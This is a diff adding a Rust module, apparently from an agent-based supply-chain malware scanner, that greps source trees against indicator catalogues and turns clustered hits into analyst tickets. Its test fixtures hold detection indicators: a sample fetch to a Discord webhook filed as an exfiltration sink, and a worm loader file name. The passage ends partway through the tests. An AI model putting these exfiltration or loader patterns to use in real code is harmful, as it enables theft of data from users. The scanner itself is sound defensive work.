@@ -1,0 +1,1297 @@
+//! Walks the tree, greps it against the curated indicator catalogues, and turns
+//! each cluster of hits into one piece of evidence for the Tracer.
+
+use std::collections::{BTreeMap, BTreeSet};
+use std::fs;
+use std::path::{Path, PathBuf};
+use std::sync::{Arc, Mutex};
+
+use serde::Deserialize;
+
+use agentwerk::agents::knowledge::Page;
+use agentwerk::codegrep::{self, Conf, Pattern};
+use agentwerk::{Knowledge, Ticket, TicketQueue};
+
+use super::report::scanner;
+
+const IOC_JAVASCRIPT: &str = include_str!("threats/javascript.json");
+const IOC_PYTHON: &str = include_str!("threats/python.json");
+const IOC_RUST: &str = include_str!("threats/rust.json");
+const IOC_CPP: &str = include_str!("threats/cpp.json");
+const IOC_GO: &str = include_str!("threats/go.json");
+const IOC_HASKELL: &str = include_str!("threats/haskell.json");
+
+pub(crate) const SEEKER_LABEL: &str = "seeking";
+pub(crate) const ANALYSIS_LABEL: &str = "security_analysis";
+pub(crate) const TRACER_LABEL: &str = "tracing";
+pub(crate) const EXPLORER_LABEL: &str = "exploration";
+
+/// Size limit on files entering the grep sweep; skips bundles,
+/// minified assets, and binary blobs.
+const MAX_GREP_FILE_BYTES: u64 = 2 * 1024 * 1024;
+
+/// Length limit on a single rendered source line in an analyst ticket.
+/// Minified-file matches can be megabytes, so every excerpt and code-snippet
+/// line is truncated to this before it reaches the ticket.
+const MAX_EXCERPT_LEN: usize = 200;
+
+/// Lines of surrounding source shown on each side of a matched line in the
+/// ticket's code snippet, so the analyst reads the real context (comments,
+/// guards, adjacent calls) without re-opening the file.
+const SNIPPET_CONTEXT: usize = 3;
+
+/// Hits within this many lines of each other in the same file are
+/// bundled into one analyst ticket. `0` disables clustering.
+pub(crate) const CLUSTER_RADIUS: usize = 20;
+
+/// File paths per `file-map-NN` knowledge page.
+const FILE_MAP_PAGE_SIZE: usize = 30;
+
+/// Limit on file-map pages, so the injected index stays bounded on a large tree.
+const FILE_MAP_MAX_PAGES: usize = 40;
+
+/// `Pattern` queries run codegrep against file contents. `Substring`
+/// queries do a byte-substring search and are reserved for credential
+/// prefixes embedded inside larger word tokens where codegrep cannot
+/// reach. `File` queries match against relative paths.
+#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "lowercase")]
+pub(crate) enum IocKind {
+    Pattern,
+    Substring,
+    File,
+}
+
+/// One catalogue entry: category, query, kind, and the prose reason the
+/// analyst sees verbatim.
+#[derive(Clone, Debug, Deserialize)]
+pub(crate) struct IocEntry {
+    pub category: String,
+    pub query: String,
+    #[serde(rename = "type")]
+    pub kind: IocKind,
+    pub reason: String,
+    /// Explicit priority value stored in the JSON catalogue. Lower ranks are
+    /// higher-signal indicators processed first, so a `--fail-fast` run
+    /// reaches a malicious verdict from the strongest evidence first.
+    pub rank: usize,
+}
+
+/// One match. Code hits carry the line span and excerpt; file hits
+/// leave those fields `None` and only carry the matched path.
+#[derive(Clone, Debug)]
+pub(crate) struct Hit {
+    pub path: PathBuf,
+    pub line: Option<usize>,
+    pub column: Option<usize>,
+    pub line_length: Option<usize>,
+    pub excerpt: Option<String>,
+    pub entry: IocEntry,
+}
+
+pub(crate) struct ScanTree {
+    pub files: usize,
+    pub extensions: Vec<String>,
+    /// Relative paths grouped by dotted extension (`.go`), each list sorted.
+    /// Written into the Tracer's knowledge as a file map so it need not glob.
+    pub files_by_ext: BTreeMap<String, Vec<String>>,
+}
+
+impl ScanTree {
+    /// Walk `root` recursively and collect every distinct file extension.
+    pub(crate) fn collect(root: &Path) -> ScanTree {
+        let mut set: BTreeSet<String> = BTreeSet::new();
+        let mut files_by_ext: BTreeMap<String, Vec<String>> = BTreeMap::new();
+        let mut files: usize = 0;
+        let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
+        while let Some(dir) = stack.pop() {
+            let entries = match fs::read_dir(&dir) {
+                Ok(it) => it,
+                Err(e) => {
+                    eprintln!("warn: cannot read {}: {e}", dir.display());
+                    continue;
+                }
+            };
+            for entry in entries.flatten() {
+                let meta = match entry.metadata() {
+                    Ok(m) => m,
+                    Err(e) => {
+                        eprintln!("warn: cannot stat {}: {e}", entry.path().display());
+                        continue;
+                    }
+                };
+                if meta.file_type().is_symlink() {
+                    continue;
+                }
+                let path = entry.path();
+                if meta.is_dir() {
+                    stack.push(path);
+                } else if meta.is_file() {
+                    files += 1;
+                    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
+                        let dotted = format!(".{ext}");
+                        set.insert(dotted.clone());
+                        let rel = path
+                            .strip_prefix(root)
+                            .unwrap_or(&path)
+                            .to_string_lossy()
+                            .into_owned();
+                        files_by_ext.entry(dotted).or_default().push(rel);
+                    }
+                }
+            }
+        }
+        for paths in files_by_ext.values_mut() {
+            paths.sort();
+        }
+        ScanTree {
+            files,
+            extensions: set.into_iter().collect(),
+            files_by_ext,
+        }
+    }
+}
+
+/// Write the tree's files into `store` as numbered `file-map-NN` pages,
+/// `FILE_MAP_PAGE_SIZE` paths each, grouped by extension so a Tracer reads the map
+/// instead of globbing. Capped at `FILE_MAP_MAX_PAGES`; a larger tree is logged as
+/// truncated. Returns the number of pages written.
+pub(crate) fn write_file_map(
+    store: &Knowledge,
+    files_by_ext: &BTreeMap<String, Vec<String>>,
+) -> usize {
+    let total: usize = files_by_ext.values().map(Vec::len).sum();
+    let entries: Vec<(&str, &str)> = files_by_ext
+        .iter()
+        .flat_map(|(ext, paths)| paths.iter().map(move |p| (ext.as_str(), p.as_str())))
+        .collect();
+
+    let mut pages = 0;
+    for chunk in entries.chunks(FILE_MAP_PAGE_SIZE).take(FILE_MAP_MAX_PAGES) {
+        pages += 1;
+        let first = chunk.first().map(|(e, _)| *e).unwrap_or("");
+        let last = chunk.last().map(|(e, _)| *e).unwrap_or("");
+        let range = if first == last {
+            first.to_string()
+        } else {
+            format!("{first} to {last}")
+        };
+        // Repeat the extension header each time it changes, so a page is scannable.
+        let mut content = String::new();
+        let mut current = "";
+        for (ext, path) in chunk {
+            if *ext != current {
+                content.push_str(&format!("## {ext}\n"));
+                current = ext;
+            }
+            content.push_str(path);
+            content.push('\n');
+        }
+        if let Err(e) = store.pages().save(Page {
+            slug: format!("file-map-{pages:02}"),
+            kind: "FileMap".into(),
+            description: format!("files {range} ({} entries)", chunk.len()),
+            content,
+            tags: vec!["file-map".into()],
+        }) {
+            scanner(format!("file map: page {pages} not written: {e}"));
+            pages -= 1;
+            break;
+        }
+    }
+
+    let covered = (pages * FILE_MAP_PAGE_SIZE).min(total);
+    if covered < total {
+        scanner(format!(
+            "file map: covered first {covered} of {total} files"
+        ));
+    }
+    pages
+}
+
+/// Map a file extension to a curated IoC catalogue (technology name +
+/// JSON). Extensions not in the table are covered only indirectly,
+/// through whatever threats the Seeker pool turns up.
+pub(crate) fn known_extension_to_catalogue(ext: &str) -> Option<(&'static str, &'static str)> {
+    match ext {
+        ".js" | ".jsx" | ".ts" | ".tsx" | ".mjs" | ".cjs" | ".mts" | ".cts" => {
+            Some(("JavaScript", IOC_JAVASCRIPT))
+        }
+        ".py" | ".pyw" | ".pyx" | ".pyi" => Some(("Python", IOC_PYTHON)),
+        ".rs" => Some(("Rust", IOC_RUST)),
+        ".c" | ".cc" | ".cpp" | ".cxx" | ".c++" | ".h" | ".hh" | ".hpp" | ".hxx" | ".h++"
+        | ".m" | ".mm" => Some(("C/C++", IOC_CPP)),
+        ".go" => Some(("Go", IOC_GO)),
+        ".hs" | ".lhs" => Some(("Haskell", IOC_HASKELL)),
+        _ => None,
+    }
+}
+
+/// Deserialize a catalogue JSON blob shipped via `include_str!`. Panics
+/// on malformed input; the catalogues are compile-time assets, not user
+/// data.
+pub(crate) fn load_catalogue(json: &str) -> Vec<IocEntry> {
+    serde_json::from_str(json).expect("catalogue is well-formed JSON")
+}
+
+/// Entries grouped by kind, with pattern queries pre-parsed once. Panics
+/// if any pattern entry fails to parse so a malformed query trips at
+/// load time, not at first hit.
+pub(crate) struct CompiledCatalogue {
+    pub patterns: Vec<(IocEntry, Pattern)>,
+    pub substrings: Vec<IocEntry>,
+    pub files: Vec<IocEntry>,
+}
+
+pub(crate) fn compile_catalogue(json: &str) -> CompiledCatalogue {
+    let conf = Conf::default_multiline();
+    let mut patterns = Vec::new();
+    let mut substrings = Vec::new();
+    let mut files = Vec::new();
+    for entry in load_catalogue(json) {
+        match entry.kind {
+            IocKind::Pattern => {
+                let pattern = Pattern::parse(&entry.query, &conf).unwrap_or_else(|e| {
+                    panic!("malformed catalogue pattern {:?}: {e}", entry.query)
+                });
+                patterns.push((entry, pattern));
+            }
+            IocKind::Substring => substrings.push(entry),
+            IocKind::File => files.push(entry),
+        }
+    }
+    CompiledCatalogue {
+        patterns,
+        substrings,
+        files,
+    }
+}
+
+/// Walk `root` and substring-match every `*<ext>` file's contents
+/// against the given queries, flushing each file's hits via `on_file`
+/// as soon as the file is fully scanned. Analyst tickets can drain
+/// mid-sweep instead of waiting for the entire pass to finish.
+pub(crate) fn find_substrings(
+    root: &Path,
+    ext: &str,
+    entries: &[IocEntry],
+    mut on_file: impl FnMut(&str, Vec<Hit>),
+) -> usize {
+    let mut count: usize = 0;
+    let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
+
+    while let Some(dir) = stack.pop() {
+        let read = match fs::read_dir(&dir) {
+            Ok(r) => r,
+            Err(_) => continue,
+        };
+        for dirent in read.flatten() {
+            let path = dirent.path();
+            let meta = match dirent.metadata() {
+                Ok(m) => m,
+                Err(_) => continue,
+            };
+            if meta.file_type().is_symlink() {
+                continue;
+            }
+            if meta.is_dir() {
+                stack.push(path);
+                continue;
+            }
+            if !meta.is_file() {
+                continue;
+            }
+            let path_str = match path.to_str() {
+                Some(s) => s,
+                None => continue,
+            };
+            if !path_str.ends_with(ext) {
+                continue;
+            }
+            if meta.len() > MAX_GREP_FILE_BYTES {
+                continue;
+            }
+            let content = match fs::read_to_string(&path) {
+                Ok(c) => c,
+                Err(_) => continue,
+            };
+            let mut file_hits: Vec<Hit> = Vec::new();
+            for (idx, line) in content.lines().enumerate() {
+                for ie in entries {
+                    if let Some(byte_pos) = line.find(&ie.query) {
+                        file_hits.push(Hit {
+                            path: path.clone(),
+                            line: Some(idx + 1),
+                            column: Some(byte_pos + 1),
+                            line_length: Some(line.len()),
+                            excerpt: Some(truncate(line, MAX_EXCERPT_LEN)),
+                            entry: ie.clone(),
+                        });
+                    }
+                }
+            }
+            if !file_hits.is_empty() {
+                count += file_hits.len();
+                on_file(&content, file_hits);
+            }
+        }
+    }
+    count
+}
+
+/// Walk `root` and run each pre-compiled codegrep pattern against
+/// every `*<ext>` file's contents, flushing each file's hits via
+/// `on_file` once the file is fully scanned. Line/column are derived
+/// from the match's byte offset; `excerpt` holds the matched substring
+/// with newlines escaped.
+pub(crate) fn find_patterns(
+    root: &Path,
+    ext: &str,
+    entries: &[(IocEntry, Pattern)],
+    mut on_file: impl FnMut(&str, Vec<Hit>),
+) -> usize {
+    let mut count: usize = 0;
+    let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
+
+    while let Some(dir) = stack.pop() {
+        let read = match fs::read_dir(&dir) {
+            Ok(r) => r,
+            Err(_) => continue,
+        };
+        for dirent in read.flatten() {
+            let path = dirent.path();
+            let meta = match dirent.metadata() {
+                Ok(m) => m,
+                Err(_) => continue,
+            };
+            if meta.file_type().is_symlink() {
+                continue;
+            }
+            if meta.is_dir() {
+                stack.push(path);
+                continue;
+            }
+            if !meta.is_file() {
+                continue;
+            }
+            let path_str = match path.to_str() {
+                Some(s) => s,
+                None => continue,
+            };
+            if !path_str.ends_with(ext) {
+                continue;
+            }
+            if meta.len() > MAX_GREP_FILE_BYTES {
+                continue;
+            }
+            let content = match fs::read_to_string(&path) {
+                Ok(c) => c,
+                Err(_) => continue,
+            };
+            let line_starts = compute_line_starts(&content);
+            // Every pattern in one catalogue shares the `Conf` `compile_catalogue`
+            // built it with, so tokenizing once per file and reusing the tokens
+            // across all patterns is exact, not an approximation: `search`
+            // itself would recompute the same tokens on every one of these calls.
+            let tokens = codegrep::tokenize_target(&content, entries[0].1.conf());
+            let mut file_hits: Vec<Hit> = Vec::new();
+            for (entry, pattern) in entries {
+                for m in codegrep::search_tokens(pattern, &tokens, &content) {
+                    let (line, column, line_length) = locate(&line_starts, &content, m.loc.start);
+                    file_hits.push(Hit {
+                        path: path.clone(),
+                        line: Some(line),
+                        column: Some(column),
+                        line_length: Some(line_length),
+                        excerpt: Some(truncate(&m.loc.substring, MAX_EXCERPT_LEN)),
+                        entry: entry.clone(),
+                    });
+                }
+            }
+            if !file_hits.is_empty() {
+                count += file_hits.len();
+                on_file(&content, file_hits);
+            }
+        }
+    }
+    count
+}
+
+/// Byte offsets where each line starts. `line_starts[0]` is always `0`.
+fn compute_line_starts(content: &str) -> Vec<usize> {
+    let mut starts = vec![0];
+    for (i, b) in content.bytes().enumerate() {
+        if b == b'\n' {
+            starts.push(i + 1);
+        }
+    }
+    starts
+}
+
+/// Map a byte offset to a 1-based (line, column, line_length) triple.
+/// Column counts characters (not bytes) inside the matched line.
+/// `line_length` is the byte length of the line containing the match
+/// start, excluding the trailing newline.
+fn locate(line_starts: &[usize], content: &str, byte_offset: usize) -> (usize, usize, usize) {
+    let clamped = byte_offset.min(content.len());
+    let line_idx = match line_starts.binary_search(&clamped) {
+        Ok(i) => i,
+        Err(i) => i.saturating_sub(1),
+    };
+    let line_start = line_starts[line_idx];
+    let line_end = if line_idx + 1 < line_starts.len() {
+        line_starts[line_idx + 1].saturating_sub(1)
+    } else {
+        content.len()
+    };
+    let column = content[line_start..clamped].chars().count() + 1;
+    let line_length = line_end - line_start;
+    (line_idx + 1, column, line_length)
+}
+
+/// Walk `root` and emit one `Hit` per (file, entry) whose `query` is a
+/// substring of the file's path relative to `root`. Reads paths only;
+/// no contents, no extension filter, no size limit.
+pub(crate) fn find_paths(root: &Path, entries: &[IocEntry], mut on_hit: impl FnMut(Hit)) -> usize {
+    let mut count: usize = 0;
+    let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
+
+    while let Some(dir) = stack.pop() {
+        let read = match fs::read_dir(&dir) {
+            Ok(r) => r,
+            Err(_) => continue,
+        };
+        for dirent in read.flatten() {
+            let path = dirent.path();
+            let meta = match dirent.metadata() {
+                Ok(m) => m,
+                Err(_) => continue,
+            };
+            if meta.file_type().is_symlink() {
+                continue;
+            }
+            if meta.is_dir() {
+                stack.push(path);
+                continue;
+            }
+            if !meta.is_file() {
+                continue;
+            }
+            let relative = path.strip_prefix(root).unwrap_or(&path);
+            let relative_str = match relative.to_str() {
+                Some(s) => s,
+                None => continue,
+            };
+            for ie in entries {
+                if relative_str.contains(&ie.query) {
+                    on_hit(Hit {
+                        path: path.clone(),
+                        line: None,
+                        column: None,
+                        line_length: None,
+                        excerpt: None,
+                        entry: ie.clone(),
+                    });
+                    count += 1;
+                }
+            }
+        }
+    }
+    count
+}
+
+/// Render an Analyst ticket body: source, line/column, a code snippet (or the
+/// bare excerpt when the source is unavailable), the IoC briefing, and the
+/// sibling listing. `source` is the file's content, threaded from the grep pass
+/// so the snippet is sliced without re-reading; `None` for path-only hits.
+pub(crate) fn render_ticket_body(hit: &Hit, technology: &str, source: Option<&str>) -> String {
+    let mut body = format!("technology: {technology}\nsource: {}\n", hit.path.display());
+    if let (Some(line), Some(column), Some(line_length)) = (hit.line, hit.column, hit.line_length) {
+        body.push_str(&format!(
+            "line: {line}\ncolumn: {column}\nline_length: {line_length}\n"
+        ));
+    }
+    let snippet = hit
+        .line
+        .and_then(|line| source.and_then(|source| code_snippet(source, &[line])));
+    match snippet {
+        Some(snippet) => body.push_str(&format!("\n--- code ---\n{snippet}")),
+        None => {
+            if let Some(excerpt) = &hit.excerpt {
+                body.push_str(&format!("excerpt: {excerpt}\n"));
+            }
+        }
+    }
+    body.push_str(&format!(
+        "\n--- IoC briefing ---\n\
+         category: {category}\n\
+         indicator: {indicator}\n\n\
+         reason:\n\
+         {reason}\n",
+        category = hit.entry.category,
+        indicator = hit.entry.query,
+        reason = hit.entry.reason,
+    ));
+    if let Some(siblings) = sibling_listing(&hit.path) {
+        body.push_str(&format!("\nfiles in this folder: {siblings}\n"));
+    }
+    body
+}
+
+/// Immediate entries of `path`'s parent directory, sorted, sub-directories
+/// marked with a trailing `/`, capped. Embedding it in the ticket lets the
+/// analyst read real filenames in the package instead of guessing. `None` when
+/// the directory cannot be read (e.g. synthetic paths in tests).
+fn sibling_listing(path: &Path) -> Option<String> {
+    let mut names: Vec<String> = fs::read_dir(path.parent()?)
+        .ok()?
+        .flatten()
+        .map(|entry| {
+            let name = entry.file_name().to_string_lossy().into_owned();
+            if entry.path().is_dir() {
+                format!("{name}/")
+            } else {
+                name
+            }
+        })
+        .collect();
+    if names.is_empty() {
+        return None;
+    }
+    names.sort();
+    names.truncate(50);
+    Some(names.join(", "))
+}
+
+/// Render a bundle ticket body for a cluster of code hits in one file. Each
+/// hit contributes its line/column and IoC briefing; one merged code snippet
+/// spanning every matched line closes the body, so the analyst sees all the
+/// flagged lines in their shared context without opening the file. When the
+/// snippet cannot be built, each hit falls back to its bare excerpt. File hits
+/// don't cluster, so callers only pass code hits here.
+pub(crate) fn render_bundle_body(hits: &[Hit], technology: &str, source: Option<&str>) -> String {
+    let lines: Vec<usize> = hits.iter().filter_map(|h| h.line).collect();
+    let snippet = source.and_then(|source| code_snippet(source, &lines));
+    let mut body = format!("technology: {technology}\nhits: {}\n", hits.len());
+    for hit in hits {
+        // A blank line separates hits; each hit carries no internal blank line,
+        // so a `source:` after a blank is an unambiguous record boundary.
+        body.push('\n');
+        body.push_str(&format!("source: {}\n", hit.path.display()));
+        if let (Some(line), Some(column), Some(line_length)) =
+            (hit.line, hit.column, hit.line_length)
+        {
+            body.push_str(&format!(
+                "line: {line}\ncolumn: {column}\nline_length: {line_length}\n"
+            ));
+        }
+        if snippet.is_none() {
+            if let Some(excerpt) = &hit.excerpt {
+                body.push_str(&format!("excerpt: {excerpt}\n"));
+            }
+        }
+        body.push_str(&format!(
+            "category: {category}\n\
+             indicator: {indicator}\n\
+             reason: {reason}\n",
+            category = hit.entry.category,
+            indicator = hit.entry.query,
+            reason = hit.entry.reason,
+        ));
+    }
+    if let Some(snippet) = snippet {
+        body.push_str(&format!("\n--- code ---\n{snippet}"));
+    }
+    if let Some(siblings) = hits.first().and_then(|h| sibling_listing(&h.path)) {
+        body.push_str(&format!("\nfiles in this folder: {siblings}\n"));
+    }
+    body
+}
+
+/// A line-numbered slice of `source` covering every line in `lines` (1-based)
+/// plus [`SNIPPET_CONTEXT`] lines on each side, with matched lines flagged `>`.
+/// Each rendered line is truncated to [`MAX_EXCERPT_LEN`] so a minified blob
+/// cannot enlarge the ticket. `None` when no line falls inside `source`.
+fn code_snippet(source: &str, lines: &[usize]) -> Option<String> {
+    let all: Vec<&str> = source.lines().collect();
+    let marked: BTreeSet<usize> = lines.iter().copied().filter(|&n| n >= 1).collect();
+    let first = *marked.iter().next()?;
+    let last = *marked.iter().next_back()?;
+    let start = first.saturating_sub(SNIPPET_CONTEXT).max(1);
+    let end = (last + SNIPPET_CONTEXT).min(all.len());
+    if start > end {
+        return None;
+    }
+    let width = end.to_string().len();
+    let mut out = String::new();
+    for number in start..=end {
+        let flag = if marked.contains(&number) { '>' } else { ' ' };
+        let text = truncate(all[number - 1], MAX_EXCERPT_LEN);
+        out.push_str(&format!("{flag} {number:>width$} | {text}\n"));
+    }
+    Some(out)
+}
+
+/// Group code hits in one file into clusters by line proximity.
+/// `cluster_radius == 0` produces singletons. Input is sorted by line.
+pub(crate) fn cluster_hits(mut hits: Vec<Hit>, cluster_radius: usize) -> Vec<Vec<Hit>> {
+    hits.sort_by_key(|h| h.line.expect("code hits carry a line"));
+    let mut clusters: Vec<Vec<Hit>> = Vec::new();
+    for hit in hits {
+        let extend = match clusters.last() {
+            Some(cur) => {
+                let last_line = cur
+                    .last()
+                    .expect("cluster never empty")
+                    .line
+                    .expect("code hits carry a line");
+                let hit_line = hit.line.expect("code hits carry a line");
+                cluster_radius > 0 && hit_line.saturating_sub(last_line) <= cluster_radius
+            }
+            None => false,
+        };
+        if extend {
+            clusters.last_mut().unwrap().push(hit);
+        } else {
+            clusters.push(vec![hit]);
+        }
+    }
+    clusters
+}
+
+/// Cluster one file's hits and render one `(priority, body)` per cluster. The
+/// priority is the cluster's strongest indicator (its lowest IoC rank), so the
+/// caller can enqueue the most diagnostic matches first.
+fn file_clusters(
+    file_hits: Vec<Hit>,
+    tech: &str,
+    cluster_radius: usize,
+    source: &str,
+) -> Vec<(usize, String)> {
+    cluster_hits(file_hits, cluster_radius)
+        .into_iter()
+        .map(|cluster| {
+            let priority = cluster
+                .iter()
+                .map(|h| h.entry.rank)
+                .min()
+                .unwrap_or(usize::MAX);
+            let body = if cluster.len() == 1 {
+                render_ticket_body(&cluster[0], tech, Some(source))
+            } else {
+                render_bundle_body(&cluster, tech, Some(source))
+            };
+            (priority, body)
+        })
+        .collect()
+}
+
+/// Owns the scan directory and clustering radius. `discover` routes
+/// extensions to their catalogues, runs the pattern/substring/file
+/// passes, and enqueues one analyst ticket per cluster.
+pub(crate) struct Scanner<'a> {
+    scan_dir: &'a Path,
+    cluster_radius: usize,
+}
+
+impl<'a> Scanner<'a> {
+    pub(crate) fn new(scan_dir: &'a Path) -> Self {
+        Self {
+            scan_dir,
+            cluster_radius: CLUSTER_RADIUS,
+        }
+    }
+
+    /// Route each extension to its catalogue, spawn one blocking task per
+    /// pass (codegrep patterns, substring, file-path), cluster hits by file,
+    /// and enqueue one analyst ticket per cluster. Returns hit counts grouped
+    /// by technology (alphabetical, only techs with > 0 hits).
+    pub(crate) async fn discover(
+        &self,
+        tickets: &Arc<TicketQueue>,
+        scan: &ScanTree,
+    ) -> Vec<(&'static str, usize)> {
+        let known_pairs: Vec<(String, &'static str, &'static str)> = scan
+            .extensions
+            .iter()
+            .filter_map(|ext| {
+                known_extension_to_catalogue(ext).map(|(tech, cat)| (ext.clone(), tech, cat))
+            })
+            .collect();
+        if known_pairs.is_empty() {
+            return Vec::new();
+        }
+
+        // Synchronous grep is fast; collect every `(priority, body)` first, then
+        // enqueue lowest-rank (strongest-evidence) tickets first so the reachability
+        // and analyst pools, and a `--fail-fast` stop, reach a malicious verdict
+        // sooner.
+        let collected: Arc<Mutex<Vec<(usize, String)>>> = Arc::new(Mutex::new(Vec::new()));
+        let mut handles = Vec::with_capacity(known_pairs.len() * 3);
+        let mut file_pass_dispatched: BTreeSet<&'static str> = BTreeSet::new();
+
+        for (ext, tech, catalogue) in known_pairs {
+            let CompiledCatalogue {
+                patterns,
+                substrings,
+                files,
+            } = compile_catalogue(catalogue);
+
+            if !patterns.is_empty() {
+                let scan_dir = self.scan_dir.to_path_buf();
+                let collected = Arc::clone(&collected);
+                let ext_for_task = ext.clone();
+                let cluster_radius = self.cluster_radius;
+                let handle = tokio::task::spawn_blocking(move || {
+                    let count =
+                        find_patterns(&scan_dir, &ext_for_task, &patterns, |source, file_hits| {
+                            let clusters = file_clusters(file_hits, tech, cluster_radius, source);
+                            collected.lock().unwrap().extend(clusters);
+                        });
+                    (tech, count)
+                });
+                handles.push(handle);
+            }
+
+            if !substrings.is_empty() {
+                let scan_dir = self.scan_dir.to_path_buf();
+                let collected = Arc::clone(&collected);
+                let ext_for_task = ext.clone();
+                let cluster_radius = self.cluster_radius;
+                let handle = tokio::task::spawn_blocking(move || {
+                    let count = find_substrings(
+                        &scan_dir,
+                        &ext_for_task,
+                        &substrings,
+                        |source, file_hits| {
+                            let clusters = file_clusters(file_hits, tech, cluster_radius, source);
+                            collected.lock().unwrap().extend(clusters);
+                        },
+                    );
+                    (tech, count)
+                });
+                handles.push(handle);
+            }
+
+            if !files.is_empty() && file_pass_dispatched.insert(tech) {
+                let scan_dir = self.scan_dir.to_path_buf();
+                let collected = Arc::clone(&collected);
+                let handle = tokio::task::spawn_blocking(move || {
+                    let count = find_paths(&scan_dir, &files, |hit| {
+                        let body = render_ticket_body(&hit, tech, None);
+                        collected.lock().unwrap().push((hit.entry.rank, body));
+                    });
+                    (tech, count)
+                });
+                handles.push(handle);
+            }
+        }
+
+        let mut per_tech: std::collections::BTreeMap<&'static str, usize> =
+            std::collections::BTreeMap::new();
+        for handle in handles {
+            match handle.await {
+                Ok((tech, count)) => {
+                    *per_tech.entry(tech).or_insert(0) += count;
+                }
+                Err(e) => scanner(format!("✗ discovery task panicked: {e}")),
+            }
+        }
+
+        let mut clusters = Arc::try_unwrap(collected)
+            .expect("all discovery tasks joined")
+            .into_inner()
+            .unwrap();
+        clusters.sort_by_key(|(priority, _)| *priority);
+        for (_, body) in clusters {
+            tickets.ticket(Ticket::new(body).label(TRACER_LABEL));
+        }
+
+        per_tech.into_iter().filter(|(_, n)| *n > 0).collect()
+    }
+}
+
+fn truncate(s: &str, max: usize) -> String {
+    let s = s.replace('\n', " ");
+    if s.chars().count() <= max {
+        return s;
+    }
+    let cut: String = s.chars().take(max).collect();
+    format!("{cut}…")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn deserializes_every_real_catalogue_into_well_formed_entries() {
+        let catalogues: &[(&str, &str, usize)] = &[
+            ("javascript", IOC_JAVASCRIPT, 30),
+            ("python", IOC_PYTHON, 30),
+            ("rust", IOC_RUST, 30),
+            ("cpp", IOC_CPP, 30),
+            ("go", IOC_GO, 30),
+            ("haskell", IOC_HASKELL, 20),
+        ];
+        for (name, source, min_entries) in catalogues {
+            let entries = load_catalogue(source);
+            assert!(
+                entries.len() >= *min_entries,
+                "{name} catalogue should produce at least {min_entries} entries, got {}",
+                entries.len()
+            );
+            for e in &entries {
+                assert!(
+                    !e.category.is_empty(),
+                    "{name}: category empty for query {}",
+                    e.query
+                );
+                assert!(!e.query.is_empty(), "{name}: query empty");
+                assert!(
+                    !e.reason.is_empty(),
+                    "{name}: reason empty for query {}",
+                    e.query
+                );
+                assert!(
+                    e.reason.len() >= 40,
+                    "{name}: reason too short for query {} ({} chars)",
+                    e.query,
+                    e.reason.len()
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn every_pattern_entry_in_every_catalogue_parses_as_a_codegrep_pattern() {
+        let catalogues: &[(&str, &str)] = &[
+            ("javascript", IOC_JAVASCRIPT),
+            ("python", IOC_PYTHON),
+            ("rust", IOC_RUST),
+            ("cpp", IOC_CPP),
+            ("go", IOC_GO),
+            ("haskell", IOC_HASKELL),
+        ];
+        let conf = Conf::default_multiline();
+        for (name, source) in catalogues {
+            for entry in load_catalogue(source) {
+                if !matches!(entry.kind, IocKind::Pattern) {
+                    continue;
+                }
+                Pattern::parse(&entry.query, &conf).unwrap_or_else(|e| {
+                    panic!(
+                        "{name}: pattern entry {:?} does not parse: {e}",
+                        entry.query
+                    )
+                });
+            }
+        }
+    }
+
+    #[test]
+    fn fast_path_extension_lookup_covers_all_six_languages() {
+        let must_route = [
+            (".js", "JavaScript"),
+            (".ts", "JavaScript"),
+            (".py", "Python"),
+            (".rs", "Rust"),
+            (".cpp", "C/C++"),
+            (".c", "C/C++"),
+            (".h", "C/C++"),
+            (".go", "Go"),
+            (".hs", "Haskell"),
+        ];
+        for (ext, expected_tech) in must_route {
+            let (tech, _cat) = known_extension_to_catalogue(ext)
+                .unwrap_or_else(|| panic!("{ext} should fast-path to a catalogue"));
+            assert_eq!(tech, expected_tech, "{ext} routed to wrong technology");
+        }
+        assert!(known_extension_to_catalogue(".unknown").is_none());
+        assert!(known_extension_to_catalogue(".json").is_none());
+    }
+
+    fn code_hit_fixture() -> Hit {
+        Hit {
+            path: PathBuf::from("src/installer.js"),
+            line: Some(87),
+            column: Some(12),
+            line_length: Some(80),
+            excerpt: Some("fetch('https://discord.com/api/webhooks/123/xyz', ...)".into()),
+            entry: IocEntry {
+                category: "Webhook exfiltration sinks".into(),
+                query: "discord.com/api/webhooks/".into(),
+                kind: IocKind::Substring,
+                reason:
+                    "Discord webhook URL prefix.\n\nA full URL of this form accepts arbitrary HTTP POSTs."
+                        .into(),
+                rank: 0,
+            },
+        }
+    }
+
+    fn file_hit_fixture() -> Hit {
+        Hit {
+            path: PathBuf::from("node_modules/widget/setup_bun.js"),
+            line: None,
+            column: None,
+            line_length: None,
+            excerpt: None,
+            entry: IocEntry {
+                category: "Worm and loader file names".into(),
+                query: "setup_bun.js".into(),
+                kind: IocKind::File,
+                reason: "Stage-one loader for the Shai-Hulud 2.0 self-replicating npm worm.".into(),
+                rank: 0,
+            },
+        }
+    }
+
+    #[test]
+    fn renders_code_ticket_body_with_full_reason() {
+        let hit = code_hit_fixture();
+        let body = render_ticket_body(&hit, "JavaScript", None);
+        assert!(body.contains("technology: JavaScript"));
+        assert!(body.contains("source: src/installer.js"));
+        assert!(body.contains("line: 87"));
+        assert!(body.contains("column: 12"));
+        assert!(body.contains("line_length: 80"));
+        assert!(body.contains("--- IoC briefing ---"));
+        assert!(body.contains("category: Webhook exfiltration sinks"));
+        assert!(body.contains("indicator: discord.com/api/webhooks/"));
+        assert!(body.contains("Discord webhook URL prefix."));
+        assert!(body.contains("A full URL of this form accepts arbitrary HTTP POSTs."));
+    }
+
+    #[test]
+    fn renders_file_ticket_body_without_line_or_column() {
+        let hit = file_hit_fixture();
+        let body = render_ticket_body(&hit, "JavaScript", None);
+        assert!(body.contains("technology: JavaScript"));
+        assert!(body.contains("source: node_modules/widget/setup_bun.js"));
+        assert!(
+            !body.contains("line:"),
+            "file hits should not emit a line field"
+        );
+        assert!(
+            !body.contains("column:"),
+            "file hits should not emit a column field"
+        );
+        assert!(
+            !body.contains("excerpt:"),
+            "file hits should not emit an excerpt field"
+        );
+        assert!(body.contains("--- IoC briefing ---"));
